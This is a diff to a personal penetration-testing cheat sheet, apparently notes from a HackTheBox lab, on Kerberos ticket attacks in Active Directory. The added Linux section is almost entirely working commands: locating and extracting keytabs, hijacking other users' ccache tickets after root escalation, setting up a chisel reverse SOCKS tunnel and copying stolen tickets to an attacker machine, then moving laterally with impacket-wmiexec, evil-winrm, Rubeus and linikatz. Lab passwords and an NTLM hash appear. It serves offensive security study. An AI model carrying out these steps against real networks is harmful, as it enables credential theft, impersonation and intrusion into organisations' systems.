@@ -53,7 +53,7 @@ dir *.kirbi #=> [randomvalue]-username@service-domain.local.kirbi
 [+] #Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.
 
 ## Rubeus - Export Tickets
-Rubeus.exe dump /nowrap # base64 format.
+Rubeus.exe dump /nowrap # base64 format. (no admin priv needs)
 
 ---------------------------------------------------------------------------
 # Pass the Key or OverPass the Hash
@@ -82,7 +82,7 @@ Rubeus asktgt /user:plaintext /rc4:<rc4_hmac_nt> /domain:inlanefreight.htb /nowr
 # Pass the Ticket (PtT)
 
 ## Rubeus Pass the Ticket
-Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt # submit the ticket (TGT or TGS) to the current logon session
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt # submit the ticket TGT to the current logon session
 Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi # import the ticket into the current session
 ### Pass the Ticket - Base64 Format
 ### we can perform a Pass the Ticket providing the base64 string instead of the file name.
@@ -114,4 +114,145 @@ PS C:\tools> Enter-PSSession -ComputerName DC01
 whoami ; hostname  # inlanefreight\john ; DC01
 ```
 
+## Pass the Ticket (PtT) from Linux
+we manage to compromise a Linux machine connected to Active Directory. In that case, we could try to find Kerberos tickets to impersonate other users and gain more access to the network.
+```bash
+# Kerberos tickets stored in: 
+/tmp #  (moste case)
+KRB5CCNAME  # environment variable (By default) 
+/etc/krb5.keytab  # machine account (access from root user only)
 
+# A keytab is a file containing pairs of Kerberos principals and encrypted keys
+
+realm list # Checking domain access setup
+id <user>@<domain> #  Checking what groups a user belongs to
+ps -ef | grep -i "winbind\|sssd" # Check If Linux Machine is Domain Joine
+
+-----------------------------------------------------------------------------
+## Finding Kerberos Tickets in Linux
+
+### Finding Keytab Files (used to get the TGT )
+
+find / -name *keytab* -ls 2>/dev/null# file.keytab
+find / \( -name '*keytab*' -o -name '*.kt' \) -ls 2>/dev/null # *.kt too
+
+[+] # Note : To use a keytab file, we must have read and write (rw) privileges on the file.
+
+### Identifying Keytab Files in Cronjobs
+
+crontab -l # * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
+cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh #=> kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
+==> svc_workstations.kt # script importing a Kerberos ticket 
+[+] # Note: As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB
+------------------------------------------------------------------------------
+### Finding ccache Files (TGT ticket)
+
+#### Reviewing Environment Variables for ccache Files.
+env | grep -i krb5 # KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
+
+#### Searching for ccache Files in /tmp
+ls -la /tmp 
+-----------------------------------------------------------------------------
+## Abusing KeyTab Files
+
+### Listing keytab File Information
+klist -k -t /opt/specialfiles/carlos.keytab #=> carlos@INLANEFREIGHT.HTB
+
+### Impersonating a User with a keytab
+klist #=> david@INLANEFREIGHT.HTB (the current ticket we are using)
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab # import the carlos ticket
+klist #=> carlos@INLANEFREIGHT.HTB 
+
+smbclient //dc01/carlos -k -c ls # Connecting to SMB Share as Carlos
+-------------------------
+### Keytab Extract
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab # NTLM , AES-256 , AES-128 
+- # NTLM -> pass the hash attack
+- # AES-256 + AES-128 -> forge our tickets
+- su - carlos@inlanefreight.htb # crack the hash to get the plaintext pass then login as carlos
+-----------------------------------------------------------------------------
+## Abusing cronjob Keytab
+repeat the process, crack the password, and log in as #=> svc_workstations user
+-----------------------------------------------------------------------------
+## Abusing Keytab ccache
+
+/tmp # we need priv sec to read the keytab file
+
+## priv esc to root (to read the /tmp keytab )
+### from Abusing cronjob Keytab or tabkey  we extract the hash and crack the pass of svc_workstations user 
+ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222 # login with the password that we crack it 
+sudo -l #  (ALL) ALL (we have priv to run sudo without pass)
+sudo su # whoami : root
+
+##  Looking for ccache Files
+ls -la /tmp #=> krb5cc_647401106_I8I133  - USER : julio@inlanefreight.htb
+id julio@inlanefreight.htb #=> domain users (indentify the group membership)
+
+## Importing the ccache File into our Current Session
+klist # No credentials cache found 
+cp /tmp/krb5cc_647401106_I8I133 .
+export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+klist # Ticket cache: FILE:/root/krb5cc_647401106_I8I133 : julio
+smbclient //dc01/C$ -k -c ls -no-pass
+
+[+] If the expiration date has passed, the ticket will not work.
+-------------------------------------------------------------------------------
+## Using Linux Attack Tools with Kerberos
+
+[+] # our attacker machine don't have connection to the Domain controller so we need to setup the trafft to the compromised domain joined machine (ex, MS01)
+-----------------
+### setup traffic via the compromised domain joined machine
+
+#### on attacker machine
+cat /etc/hosts
+# 172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
+# 172.16.1.5  ms01.inlanefreight.htb  ms01
+cat /etc/proxychains4.conf #=>  socks5 127.0.0.1 1080
+./chisel server --reverse --socks5 # Listening on http://0.0.0.0:8080
+
+#### on the compromised domaain joined machine (MS01)
+xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution # connect to MS01
+./chisel client <your-attacker-ip>:8080 R:socks
+copy <keytab-ticket> \\attacker-ip\tmp # mov the ticket to the attacker machine
+
+#### on attacker machine
+export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133 # Setting the ticket Environment Variable
+---------------------
+### Impacket
+
+proxychains impacket-wmiexec dc01 -k # => whoami : inlanefreight\julio
+[+] # Note: If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.
+
+### Evil-Winrm
+#### Installing Kerberos Authentication Package
+sudo apt-get install krb5-user -y 
+# set  the Default Kerberos Version 5 realm : "INLANEFREIGHT.HTB"
+# set the  Administrative Server for your Kerberos Realm to  "DC01"
+
+cat /etc/krb5.conf
+[libdefaults]
+        default_realm = INLANEFREIGHT.HTB
+
+<SNIP>
+
+[realms]
+    INLANEFREIGHT.HTB = {
+        kdc = dc01.inlanefreight.htb
+    }
+<SNIP>
+#### Using Evil-WinRM with Kerberos
+proxychains evil-winrm -i dc01 -r inlanefreight.htb #=> whoami : julio ; hostname : DC01
+-------------------------------------------------------------------------------
+## Convert tickets   
+
+impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi # linux tickets to windows tickets
+impacket-ticketConverter julio.kirbi krb5cc_647401106_I8I133 # windows tickets to linux tickets
+
+#### Importing Converted Ticket into Windows Session with Rubeus
+C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi 
+klist # julio @ INLANEFREIGHT.HTB :  krbtgt
+dir \\dc01\julio
+-------------------------------------------------------------------------------
+## Linikatz
+./linikatz.sh # creds & tickets dump  (mimikatz version for linux)
+```
